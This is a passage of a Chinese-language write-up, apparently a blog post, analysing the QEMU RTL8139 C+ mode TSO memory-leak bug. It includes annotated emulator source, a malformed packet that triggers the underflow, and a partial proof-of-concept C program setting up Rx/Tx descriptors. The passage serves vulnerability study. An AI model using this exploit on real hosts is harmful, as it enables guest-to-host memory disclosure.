&amp;= ~CP_TX_STATUS_EXC; /* update ring data */ val = cpu_to_le32(txdw0); pci_dma_write(d, cplus_tx_ring_desc, (uint8_t *)&amp;val, 4); /* Now decide if descriptor being processed is holding the last segment of packet */ if (txdw0 &amp; CP_TX_LS) &#123; uint8_t dot1q_buffer_space[VLAN_HLEN]; uint16_t *dot1q_buffer; DPRINTF("+++ C+ Tx mode : descriptor %d is last segment descriptor\n", descriptor); /* can transfer fully assembled packet */ uint8_t *saved_buffer = s-&gt;cplus_txbuffer; //获取s中存储的发送数据缓冲区起始地址 int saved_size = s-&gt;cplus_txbuffer_offset; int saved_buffer_len = s-&gt;cplus_txbuffer_len; /* create vlan tag */ if (txdw1 &amp; CP_TX_TAGC) &#123; /* the vlan tag is in BE byte order in the descriptor * BE + le_to_cpu() + ~swap()~ = cpu */ DPRINTF("+++ C+ Tx mode : inserting vlan tag with ""tci: %u\n", bswap16(txdw1 &amp; CP_TX_VLAN_TAG_MASK)); dot1q_buffer = (uint16_t *) dot1q_buffer_space; dot1q_buffer[0] = cpu_to_be16(ETH_P_8021Q); /* BE + le_to_cpu() + ~cpu_to_le()~ = BE */ dot1q_buffer[1] = cpu_to_le16(txdw1 &amp; CP_TX_VLAN_TAG_MASK); &#125; else &#123; dot1q_buffer = NULL; &#125; /* reset the card space to protect from recursive call */ s-&gt;cplus_txbuffer = NULL; s-&gt;cplus_txbuffer_offset = 0; s-&gt;cplus_txbuffer_len = 0; if (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN)) &#123; DPRINTF("+++ C+ mode offloaded task checksum\n"); /* ip packet header */ ip_header *ip = NULL; int hlen = 0; uint8_t ip_protocol = 0; uint16_t ip_data_len = 0; uint8_t *eth_payload_data = NULL; size_t eth_payload_len = 0; int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12)); //proto = saved_buffer + 12 if (proto == ETH_P_IP) &#123; DPRINTF("+++ C+ mode has IP packet\n"); /* not aligned */ eth_payload_data = saved_buffer + ETH_HLEN; //eth_payload_data = saved_buffer + 14 eth_payload_len = saved_size - ETH_HLEN; ip = (ip_header*)eth_payload_data; //获取ip包起始地址: ip = eth_payload_data if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123; DPRINTF("+++ C+ mode packet has bad IP version %d " "expected %d\n", IP_HEADER_VERSION(ip), IP_HEADER_VERSION_4); ip = NULL; &#125; else &#123; hlen = IP_HEADER_LENGTH(ip); ip_protocol = ip-&gt;ip_p; ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen; //溢出点,之后ip_data_len会传给tcp_data_len &#125; &#125; //开始处理tcp包 if (ip) &#123; if (txdw0 &amp; CP_TX_IPCS) &#123; DPRINTF("+++ C+ mode need IP checksum\n"); if (hlen&lt;sizeof(ip_header) || hlen&gt;eth_payload_len) &#123;/* min header length */ /* bad packet header len */ /* or packet too short */ &#125; else &#123; ip-&gt;ip_sum = 0; ip-&gt;ip_sum = ip_checksum(ip, hlen); DPRINTF("+++ C+ mode IP header len=%d checksum=%04x\n", hlen, ip-&gt;ip_sum); &#125; &#125; if ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP) &#123; int large_send_mss = (txdw0 &gt;&gt; 16) &amp; CP_TC_LGSEN_MSS_MASK; DPRINTF("+++ C+ mode offloaded task TSO MTU=%d IP data %d " "frame data %d specified MSS=%d\n", ETH_MTU, ip_data_len, saved_size - ETH_HLEN, large_send_mss); int tcp_send_offset = 0; int send_count = 0; /* maximum IP header length is 60 bytes */ uint8_t saved_ip_header[60]; /* save IP header template; data area is used in tcp checksum calculation */ memcpy(saved_ip_header, eth_payload_data, hlen); /* a placeholder for checksum calculation routine in tcp case */ uint8_t *data_to_checksum = eth_payload_data + hlen - 12; // size_t data_to_checksum_len = eth_payload_len - hlen + 12; /* pointer to TCP header */ tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen); int tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr); /* ETH_MTU = ip header len + tcp header len + payload */ int tcp_data_len = ip_data_len - tcp_hlen; int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen; DPRINTF("+++ C+ mode TSO IP data len %d TCP hlen %d TCP " "data len %d TCP chunk size %d\n", ip_data_len, tcp_hlen, tcp_data_len, tcp_chunk_size); /* note the cycle below overwrites IP header data, but restores it from saved_ip_header before sending packet */ int is_last_frame = 0; for (tcp_send_offset = 0; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size) &#123; uint16_t chunk_size = tcp_chunk_size; /* check if this is the last frame */ if (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len) &#123; is_last_frame = 1; chunk_size = tcp_data_len - tcp_send_offset; &#125; DPRINTF("+++ C+ mode TSO TCP seqno %08x\n", be32_to_cpu(p_tcp_hdr-&gt;th_seq)); /* add 4 TCP pseudoheader fields */ /* copy IP source and destination fields */ memcpy(data_to_checksum, saved_ip_header + 12, 8); DPRINTF("+++ C+ mode TSO calculating TCP checksum for " "packet with %d bytes data\n", tcp_hlen + chunk_size); if (tcp_send_offset) &#123; memcpy((uint8_t*)p_tcp_hdr + tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size); //数据越界泄露点 &#125; /* keep PUSH and FIN flags only for the last frame */ if (!is_last_frame) &#123; TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN); &#125; /* recalculate TCP checksum */ ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum; p_tcpip_hdr-&gt;zeros = 0; p_tcpip_hdr-&gt;ip_proto = IP_PROTO_TCP; p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size); p_tcp_hdr-&gt;th_sum = 0; int tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + 12); DPRINTF("+++ C+ mode TSO TCP checksum %04x\n", tcp_checksum); p_tcp_hdr-&gt;th_sum = tcp_checksum; /* restore IP header */ memcpy(eth_payload_data, saved_ip_header, hlen); /* set IP data length and recalculate IP checksum */ ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size); /* increment IP id for subsequent frames */ ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id)); ip-&gt;ip_sum = 0; ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen); DPRINTF("+++ C+ mode TSO IP header len=%d " "checksum=%04x\n", hlen, ip-&gt;ip_sum); int tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size; DPRINTF("+++ C+ mode TSO transferring packet size " "%d\n", tso_send_size); rtl8139_transfer_frame(s, saved_buffer, tso_send_size, 0, (uint8_t *) dot1q_buffer); //将数据发送出去 /* add transferred count to TCP sequence number */ p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq)); ++send_count; &#125; /* Stop sending this frame */ saved_size = 0; &#125; else if (txdw0 &amp; (CP_TX_TCPCS|CP_TX_UDPCS)) &#123; ... &#125; ...&#125; 继续看rtl8139_transfer_frame函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152static void rtl8139_transfer_frame(RTL8139State *s, uint8_t *buf, int size, int do_interrupt, const uint8_t *dot1q_buf)&#123; struct iovec *iov = NULL; struct iovec vlan_iov[3]; if (!size) &#123; DPRINTF("+++ empty ethernet frame\n"); return; &#125; if (dot1q_buf &amp;&amp; size &gt;= ETHER_ADDR_LEN * 2) &#123; iov = (struct iovec[3]) &#123; &#123; .iov_base = buf, .iov_len = ETHER_ADDR_LEN * 2 &#125;, &#123; .iov_base = (void *) dot1q_buf, .iov_len = VLAN_HLEN &#125;, &#123; .iov_base = buf + ETHER_ADDR_LEN * 2, .iov_len = size - ETHER_ADDR_LEN * 2 &#125;, &#125;; memcpy(vlan_iov, iov, sizeof(vlan_iov)); iov = vlan_iov; &#125; if (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))//需要设置TxConfig中的TxLoopBack标志位 &#123; size_t buf2_size; uint8_t *buf2; if (iov) &#123; buf2_size = iov_size(iov, 3); buf2 = g_malloc(buf2_size); iov_to_buf(iov, 3, 0, buf2, buf2_size); buf = buf2; &#125; DPRINTF("+++ transmit loopback mode\n"); rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);//发送回给自己的网卡 if (iov) &#123; g_free(buf2); &#125; &#125; else &#123; if (iov) &#123; qemu_sendv_packet(qemu_get_queue(s-&gt;nic), iov, 3); &#125; else &#123; qemu_send_packet(qemu_get_queue(s-&gt;nic), buf, size); //否则正常发送出去 &#125; &#125;&#125; 继续分析rtl8139_do_receive： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251static ssize_t rtl8139_do_receive(NetClientState *nc, const uint8_t *buf, size_t size_, int do_interrupt)&#123; RTL8139State *s = qemu_get_nic_opaque(nc); PCIDevice *d = PCI_DEVICE(s); /* size is the length of the buffer passed to the driver */ int size = size_; const uint8_t *dot1q_buf = NULL; uint32_t packet_header = 0; uint8_t buf1[MIN_BUF_SIZE + VLAN_HLEN]; static const uint8_t broadcast_macaddr[6] = &#123; 0xff, 0xff, 0xff, 0xff, 0xff, 0xff &#125;; DPRINTF("&gt;&gt;&gt; received len=%d\n", size); /* test if board clock is stopped */ if (!s-&gt;clock_enabled) &#123; DPRINTF("stopped ==========================\n"); return -1; &#125; /* first check if receiver is enabled */ if (!rtl8139_receiver_enabled(s)) &#123; DPRINTF("receiver disabled ================\n"); return -1; &#125; /* XXX: check this */ if (s-&gt;RxConfig &amp; AcceptAllPhys) &#123; //s-&gt;RxConfig不设置AcceptAllPhys自动绕过 /* promiscuous: receive all */ DPRINTF("&gt;&gt;&gt; packet received in promiscuous mode\n"); &#125; else &#123; if (!memcmp(buf, broadcast_macaddr, 6)) &#123; /* broadcast address */ if (!(s-&gt;RxConfig &amp; AcceptBroadcast)) &#123; DPRINTF("&gt;&gt;&gt; broadcast packet rejected\n"); /* update tally counter */ ++s-&gt;tally_counters.RxERR; return size; &#125; packet_header |= RxBroadcast; DPRINTF("&gt;&gt;&gt; broadcast packet received\n"); /* update tally counter */ ++s-&gt;tally_counters.RxOkBrd; &#125; else if (buf[0] &amp; 0x01) &#123; /* multicast */ if (!(s-&gt;RxConfig &amp; AcceptMulticast)) &#123; DPRINTF("&gt;&gt;&gt; multicast packet rejected\n"); /* update tally counter */ ++s-&gt;tally_counters.RxERR; return size; &#125; int mcast_idx = compute_mcast_idx(buf); if (!(s-&gt;mult[mcast_idx &gt;&gt; 3] &amp; (1 &lt;&lt; (mcast_idx &amp; 7)))) &#123; DPRINTF("&gt;&gt;&gt; multicast address mismatch\n"); /* update tally counter */ ++s-&gt;tally_counters.RxERR; return size; &#125; packet_header |= RxMulticast; DPRINTF("&gt;&gt;&gt; multicast packet received\n"); /* update tally counter */ ++s-&gt;tally_counters.RxOkMul; &#125; else if (s-&gt;phys[0] == buf[0] &amp;&amp; s-&gt;phys[1] == buf[1] &amp;&amp; s-&gt;phys[2] == buf[2] &amp;&amp; s-&gt;phys[3] == buf[3] &amp;&amp; s-&gt;phys[4] == buf[4] &amp;&amp; s-&gt;phys[5] == buf[5]) &#123; //mac地址需要匹配上 /* match */ if (!(s-&gt;RxConfig &amp; AcceptMyPhys)) //s-&gt;RxConfig需要设置AcceptMyPhys绕过 &#123; DPRINTF("&gt;&gt;&gt; rejecting physical address matching packet\n"); /* update tally counter */ ++s-&gt;tally_counters.RxERR; return size; &#125; packet_header |= RxPhysical; DPRINTF("&gt;&gt;&gt; physical address matching packet received\n"); /* update tally counter */ ++s-&gt;tally_counters.RxOkPhy; &#125; else &#123; DPRINTF("&gt;&gt;&gt; unknown packet\n"); /* update tally counter */ ++s-&gt;tally_counters.RxERR; return size; &#125; &#125; /* if too small buffer, then expand it * Include some tailroom in case a vlan tag is later removed. */ if (size &lt; MIN_BUF_SIZE + VLAN_HLEN) &#123; memcpy(buf1, buf, size); memset(buf1 + size, 0, MIN_BUF_SIZE + VLAN_HLEN - size); buf = buf1; if (size &lt; MIN_BUF_SIZE) &#123; size = MIN_BUF_SIZE; &#125; &#125; if (rtl8139_cp_receiver_enabled(s)) &#123; if (!rtl8139_cp_rx_valid(s)) &#123; return size; &#125; DPRINTF("in C+ Rx mode ================\n"); /* begin C+ receiver mode *//* w0 ownership flag */#define CP_RX_OWN (1&lt;&lt;31)/* w0 end of ring flag */#define CP_RX_EOR (1&lt;&lt;30)/* w0 bits 0...12 : buffer size */#define CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)/* w1 tag available flag */#define CP_RX_TAVA (1&lt;&lt;16)/* w1 bits 0...15 : VLAN tag */#define CP_RX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)/* w2 low 32bit of Rx buffer ptr *//* w3 high 32bit of Rx buffer ptr */ int descriptor = s-&gt;currCPlusRxDesc; dma_addr_t cplus_rx_ring_desc; cplus_rx_ring_desc = rtl8139_addr64(s-&gt;RxRingAddrLO, s-&gt;RxRingAddrHI); cplus_rx_ring_desc += 16 * descriptor; DPRINTF("+++ C+ mode reading RX descriptor %d from host memory at " "%08x %08x = "DMA_ADDR_FMT"\n", descriptor, s-&gt;RxRingAddrHI, s-&gt;RxRingAddrLO, cplus_rx_ring_desc); uint32_t val, rxdw0,rxdw1,rxbufLO,rxbufHI; pci_dma_read(d, cplus_rx_ring_desc, &amp;val, 4); rxdw0 = le32_to_cpu(val); pci_dma_read(d, cplus_rx_ring_desc+4, &amp;val, 4); rxdw1 = le32_to_cpu(val); pci_dma_read(d, cplus_rx_ring_desc+8, &amp;val, 4); rxbufLO = le32_to_cpu(val); pci_dma_read(d, cplus_rx_ring_desc+12, &amp;val, 4); rxbufHI = le32_to_cpu(val); DPRINTF("+++ C+ mode RX descriptor %d %08x %08x %08x %08x\n", descriptor, rxdw0, rxdw1, rxbufLO, rxbufHI); if (!(rxdw0 &amp; CP_RX_OWN)) //Rx desc的dw0位需要设置CP_RX_OWN绕过 &#123; DPRINTF("C+ Rx mode : descriptor %d is owned by host\n", descriptor); s-&gt;IntrStatus |= RxOverflow; ++s-&gt;RxMissed; /* update tally counter */ ++s-&gt;tally_counters.RxERR; ++s-&gt;tally_counters.MissPkt; rtl8139_update_irq(s); return size_; &#125; uint32_t rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK; /* write VLAN info to descriptor variables. */ if (s-&gt;CpCmd &amp; CPlusRxVLAN &amp;&amp; be16_to_cpup((uint16_t *) //s-&gt;CpCmd不设置CPlusRxVLAN自动绕过 &amp;buf[ETHER_ADDR_LEN * 2]) == ETH_P_8021Q) &#123; dot1q_buf = &amp;buf[ETHER_ADDR_LEN * 2]; size -= VLAN_HLEN; /* if too small buffer, use the tailroom added duing expansion */ if (size &lt; MIN_BUF_SIZE) &#123; size = MIN_BUF_SIZE; &#125; rxdw1 &amp;= ~CP_RX_VLAN_TAG_MASK; /* BE + ~le_to_cpu()~ + cpu_to_le() = BE */ rxdw1 |= CP_RX_TAVA | le16_to_cpup((uint16_t *) &amp;dot1q_buf[ETHER_TYPE_LEN]); DPRINTF("C+ Rx mode : extracted vlan tag with tci: ""%u\n", be16_to_cpup((uint16_t *)&amp;dot1q_buf[ETHER_TYPE_LEN])); &#125; else &#123; /* reset VLAN tag flag */ rxdw1 &amp;= ~CP_RX_TAVA; &#125; /* TODO: scatter the packet over available receive ring descriptors space */ if (size+4 &gt; rx_space) &#123; DPRINTF("C+ Rx mode : descriptor %d size %d received %d + 4\n", descriptor, rx_space, size); s-&gt;IntrStatus |= RxOverflow; ++s-&gt;RxMissed; /* update tally counter */ ++s-&gt;tally_counters.RxERR; ++s-&gt;tally_counters.MissPkt; rtl8139_update_irq(s); return size_; &#125; dma_addr_t rx_addr = rtl8139_addr64(rxbufLO, rxbufHI); /* receive/copy to target memory */ if (dot1q_buf) &#123; //前面的限制都绕过，dot1q_buf默认为NULL pci_dma_write(d, rx_addr, buf, 2 * ETHER_ADDR_LEN); pci_dma_write(d, rx_addr + 2 * ETHER_ADDR_LEN, buf + 2 * ETHER_ADDR_LEN + VLAN_HLEN, size - 2 * ETHER_ADDR_LEN); &#125; else &#123; pci_dma_write(d, rx_addr, buf, size); //我们需要到达这里，会把数据发给rx_addr &#125;...&#125; 重要寄存器的偏移与作用说明： 12345678910111213141516171819 +---------------------------+----------------------------+0x00 | MAC0 | MAR0 | +---------------------------+----------------------------+0x10 | TxStatus0 | +--------------------------------------------------------+0x20 | TxAddr0 | +-------------------+-------+----------------------------+0x30 | RxBuf |ChipCmd| | +-------------+------+------+----------------------------+0x40 | TxConfig | RxConfig | ... | +-------------+-------------+----------------------------+ | | | skipping irrelevant registers | | | +---------------------------+--+------+------------------+0xd0 | ... | |TxPoll| ... | +-------+------+------------+--+------+--+---------------+0xe0 | CpCmd | ... |RxRingAddrLO|RxRingAddrHI| ... | +-------+------+------------+------------+---------------+ TxConfig: Enable/disable Tx flags such as TxLoopBack (enable loopbacktest mode), TxCRC (do not append CRC to Tx Packets), etc. RxConfig: Enable/disable Rx flags such as AcceptBroadcast (acceptbroadcast packets), AcceptMulticast (accept multicast packets), etc. CpCmd: C+ command register used to enable some functions such asCplusRxEnd (enable receive), CplusTxEnd (enable transmit), etc. TxAddr0: Physical memory address of Tx descriptors table. RxRingAddrLO: Low 32-bits physical memory address of Rx descriptorstable. RxRingAddrHI: High 32-bits physical memory address of Rx descriptorstable. TxPoll: Tell the card to check Tx descriptors. =&gt; 将Tx descriptors缓冲区中的数据包发送出去。 A Rx/Tx-descriptor is defined by the following structure where buf_lo andbuf_hi are low 32 bits and high 32 bits physical memory address of Tx/Rxbuffers, respectively. These addresses point to buffers holding packets tobe sent/received and must be aligned on page size boundary. The variabledw0 encodes the size of the buffer plus additional flags such as theownership flag to denote if the buffer is owned by the card or the driver. 关于rtl8139_ring和rtl8139_desc这两个重要结构体，他们在源码中并未定义，而是栈中的临时变量： phrack把他们提取了出来，方便我们构造： 1234567891011struct rtl8139_ring &#123; struct rtl8139_desc *desc; void *buffer;&#125;;struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;&#125;; 调试与poc 若gdb attach失败，尝试用sudo，若仍然失败，可以尝试更新gdb： 1234567wget http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.xztar -xf gdb-9.2.tar.xz &amp;&amp; cd gdb-9.2/mkdir build &amp;&amp; cd build../configuremakesudo cp /usr/bin/gdb /usr/bin/gdb.baksudo cp ./gdb/gdb /usr/bin/gdb qemu可用poweroff命令完全退出，用exit会退出表层但是它会继续让你login。 出现pc.ram的错误时： https://my.oschina.net/u/4300698/blog/3382351 关于如何将poc/exp传送进虚拟机中： 直接在虚拟机里面用nano编辑mypoc.c，将内容复制进去之后用gcc编译运行。 启动脚本中添加-net user,hostfwd=tcp::9999-:22 -net nic，编译好mypoc之后，在之前制作img的那个文件夹里运行scp -i ./ssh/id_rsa -P 9999 ./mypoc root@localhost:~/，然后进入qemu虚拟机在~目录下运行poc。 函数调用链：rtl8139_ioport_write=&gt;rtl8139_io_writeb=&gt;rtl8139_cplus_transmit=&gt;rtl8139_cplus_transmit_one 在rtl8139_io_writeb函数中，当addr == TxPoll并且val == 1&lt;&lt;6时触发漏洞函数： 123456789101112131415161718192021222324252627282930static void rtl8139_io_writeb(void *opaque, uint8_t addr, uint32_t val)&#123; RTL8139State *s = opaque; switch (addr) &#123; .... case TxPoll: DPRINTF("C+ TxPoll write(b) val=0x%02x\n", val); if (val &amp; (1 &lt;&lt; 7)) &#123; DPRINTF("C+ TxPoll high priority transmission (not " "implemented)\n"); //rtl8139_cplus_transmit(s); &#125; if (val &amp; (1 &lt;&lt; 6)) &#123; DPRINTF("C+ TxPoll normal priority transmission\n"); rtl8139_cplus_transmit(s); &#125; break; default: DPRINTF("not implemented write(b) addr=0x%x val=0x%02x\n", addr, val); break; &#125;&#125; 关于数据链路层帧的构造： 构造结果如下： 12345678910111213141516171819202122232425262728293031uint8_t rtl8139_packet[] = &#123; // Ethernet Frame Header 数据 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // DST MAC 52:54:00:12:34:56 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // SRC MAC 52:54:00:12:34:56 0x08, 0x00, // Length / Type: IPv4 // Ethernet Frame Payload 数据, 即 IPv4 数据包 // Version &amp; IHL(Internet Header Length) (0x04 &lt;&lt; 4) | 0x05, // 4bits version = 0x4x | 4bits hlen =0xx5 =&gt; 0x05 * 4 = 20 bytes 0x00, // 8bit TOS 0x00, 0x13, // 16bits Total Length = 0x13 = 19 bytes,19-20 = -1 = 0xFFFF, trigger vulnerability 0xde, 0xad, // 16bits Identification 0x40, 0x00, // 3bits Flags &amp; 13bits Fragment Offset 0x40, // 8bits TTL 0x06, // 8bits Protocol:TCP 0xde, 0xad, // 16bits Header checksum 0x7f, 0x00, 0x00, 0x01, // 32bits Source IP:127.0.0.1 0x7f, 0x00, 0x00, 0x01, // 32bits Destination IP:127.0.0.1 // IP Packet Payload 数据, 即 TCP 数据包 0xde, 0xad, // 16bits Source Port 0xbe, 0xef, // 16bits Destination Port 0x00, 0x00, 0x00, 0x00, // 32bits Sequence Number 0x00, 0x00, 0x00, 0x00, // 32bits Acknowledgement Number 0x50, // 01010000, 4bits Header Length = 5*4 = 20 &amp;&amp; 4bits null 0x10, // 00010000, 2bits null &amp;&amp; 2bits URG ACK PSH RST SYN FIN 0xde, 0xad, // 16bits Window Size 0xde, 0xad, // 16bits TCP checksum 0x00, 0x00 // 16bits Urgent Pointer&#125;; 这里需要提一点是DST MAC我们在后面必须要和Rx网卡的MAC地址一样才能绕过限制，这里得根据具体情况来看，有的师傅最后一位是是0x57(enp0s4)，有的师傅是0x56(enp0s3)，我自己是0x56。 poc.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;sys/io.h&gt;// 页面相关参数#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)// Ethernet Frame 大小// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)#define RTL8139_BUFFER_SIZE 1514// RTL8139 网卡 PMIO 地址#define RTL8139_PORT 0xc000// Rx ownership flag#define CP_RX_OWN (1&lt;&lt;31)// w0 end of ring flag#define CP_RX_EOR (1&lt;&lt;30)// Rx buffer size mask 表示 0 ~ 12 位为 buffer size#define CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)// Tx ownership flag#define CP_TX_OWN (1&lt;&lt;31)// Tx end of ring flag#define CP_TX_EOR (1&lt;&lt;30)// last segment of received packet flag#define CP_TX_LS (1&lt;&lt;28)// large send packet flag#define CP_TX_LGSEN (1&lt;&lt;27)// IP checksum offload flag#define CP_TX_IPCS (1&lt;&lt;18)// TCP checksum offload flag#define CP_TX_TCPCS (1&lt;&lt;16)// RTL8139 网卡寄存器偏移地址,可在源码中查看enum RTL8139_registers &#123; TxAddr0 = 0x20, // Tx descriptor address ChipCmd = 0x37, TxConfig = 0x40, RxConfig = 0x44, TxPoll = 0xD9, // tell chip to check Tx descriptors for work CpCmd = 0xE0, // C+ Command register (C+ mode only) // 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor address RxRingAddrLO = 0xE4, // 32-bit low addr of Rx descriptor RxRingAddrHI = 0xE8, // 32-bit high addr of Rx descriptor&#125;;enum RTL_8139_tx_config_bits &#123; TxLoopBack = (1 &lt;&lt; 18) | (1 &lt;&lt; 17), // enable loopback test mode&#125;;enum RTL_8139_rx_mode_bits &#123; AcceptErr = 0x20, AcceptRunt = 0x10, AcceptBroadcast = 0x08, AcceptMulticast = 0x04, AcceptMyPhys = 0x02, AcceptAllPhys = 0x01,&#125;;enum RTL_8139_CplusCmdBits &#123; CPlusRxVLAN = 0x0040, /* enable receive VLAN detagging */ CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */ CPlusRxEnb = 0x0002, CPlusTxEnb = 0x0001,&#125;;enum RT8139_ChipCmdBits &#123; CmdReset = 0x10, CmdRxEnb = 0x08, CmdTxEnb = 0x04, RxBufEmpty = 0x01,&#125;;enum RTL8139_TxPollBits &#123; CPlus = (0x1 &lt;&lt; 6),&#125;;// RTL8139 Rx / Tx descriptortypedef struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;&#125;rtl8139_desc;// RTL8139 Rx / Tx ringtypedef struct rtl8139_ring &#123; struct rtl8139_desc* desc; void* buffer;&#125;rtl8139_ring;uint8_t rtl8139_packet[] = &#123; // Ethernet Frame Header 数据 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // DST MAC 52:54:00:12:34:56 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // SRC MAC 52:54:00:12:34:56 0x08, 0x00, // Length / Type: IPv4 // Ethernet Frame Payload 数据, 即 IPv4 数据包 // Version &amp; IHL(Internet Header Length) (0x04 &lt;&lt; 4) | 0x05, // 4bits version = 0x4x | 4bits hlen =0xx5 =&gt; 0x05 * 4 = 20 bytes 0x00, // 8bit TOS 0x00, 0x13, // 16bits Total Length = 0x13 = 19 bytes,19-20 = -1 = 0xFFFF, trigger vulnerability 0xde, 0xad, // 16bits Identification 0x40, 0x00, // 3bits Flags &amp; 13bits Fragment Offset 0x40, // 8bits TTL 0x06, // 8bits Protocol:TCP 0xde, 0xad, // 16bits Header checksum 0x7f, 0x00, 0x00, 0x01, // 32bits Source IP:127.0.0.1 0x7f, 0x00, 0x00, 0x01, // 32bits Destination IP:127.0.0.1 // IP Packet Payload 数据, 即 TCP 数据包 0xde, 0xad, // 16bits Source Port 0xbe, 0xef, // 16bits Destination Port 0x00, 0x00, 0x00, 0x00, // 32bits Sequence Number 0x00, 0x00, 0x00, 0x00, // 32bits Acknowledgement Number 0x50, // 01010000, 4bits Header Length = 5*4 = 20 &amp;&amp; 4bits null 0x10, // 00010000, 2bits null &amp;&amp; 2bits URG ACK PSH RST SYN FIN 0xde, 0xad, // 16bits Window Size 0xde, 0xad, // 16bits TCP checksum 0x00, 0x00 // 16bits Urgent Pointer&#125;;uint64_t get_physical_pfn(void* addr) &#123; uint64_t pfn = -1; FILE* fp = fopen("/proc/self/pagemap","rb"); if (!fp) &#123; return pfn; &#125; if (!fseek(fp,(unsigned long)addr/PAGE_SIZE*8,SEEK_SET)) &#123; fread(&amp;pfn,sizeof(pfn),1,fp); if (pfn &amp; PFN_PRESENT) &#123; pfn &amp;= PFN_PFN; &#125; &#125; fclose(fp); return pfn;&#125;uint64_t gva_to_gpa(void* addr) &#123; uint64_t pfn = get_physical_pfn(addr); return pfn * PAGE_SIZE + (uint64_t)addr % PAGE_SIZE;&#125;void rtl8139_desc_config_rx(rtl8139_ring* ring, rtl8139_desc* desc, size_t nb) &#123; size_t buffer_size = RTL8139_BUFFER_SIZE+4; for (size_t i = 0; i &lt; nb; ++i) &#123; memset(&amp;desc[i],0,sizeof(desc[i])); ring[i].desc = &amp;desc[i]; ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size); memset(ring[i].buffer,0,buffer_size); // descriptor owned by NIC 准备接收数据 ring[i].desc-&gt;dw0 |= CP_RX_OWN; if (i == nb-1) &#123; ring[i].desc-&gt;dw0 |= CP_RX_EOR; // End of Ring &#125; ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK; ring[i].desc-&gt;dw0 |= buffer_size; // buffer_size ring[i].desc-&gt;buf_lo = (uint32_t)gva_to_gpa(ring[i].buffer); &#125; // Rx descriptors address outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+RxRingAddrLO);//因为物理地址较小，所以uint32_t足够 outl(0,RTL8139_PORT+RxRingAddrHI);&#125;void rtl8139_desc_config_tx(rtl8139_desc* desc, void* buffer) &#123; memset(desc, 0, sizeof(rtl8139_desc)); desc-&gt;dw0 |= CP_TX_OWN | // descriptor owned by NIC 准备发送数据 CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS; desc-&gt;dw0 += RTL8139_BUFFER_SIZE; desc-&gt;buf_lo = (uint32_t)gva_to_gpa(buffer); outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+TxAddr0); outl(0,RTL8139_PORT+TxAddr0+4);&#125;void rtl8139_card_config() &#123; // 触发漏洞需要设置的一些参数 outl(TxLoopBack,RTL8139_PORT+TxConfig); 